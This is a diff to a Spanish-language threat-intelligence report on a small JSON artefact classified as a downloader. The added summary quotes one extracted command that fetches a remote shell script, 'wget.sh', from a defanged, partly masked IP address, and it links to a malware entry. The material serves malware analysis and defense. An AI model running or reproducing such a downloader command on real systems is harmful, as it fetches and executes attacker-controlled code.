@@ -4,7 +4,9 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como JSON text data de 236 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se extrajeron 2 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Artefacto identificado como JSON text data de 236 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `wget hxxp://91.92.40.XXX/wget.sh -O-` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/8f34e92df6a2e369794e7e475827b0a085c35cb35ac7a7e2c61a63e21c394bed.md](../../../../../malware-like/oraculo/downloader/8f34e92df6a2e369794e7e475827b0a085c35cb35ac7a7e2c61a63e21c394bed.md)
 
 
 ## 🏷️ Clasificación
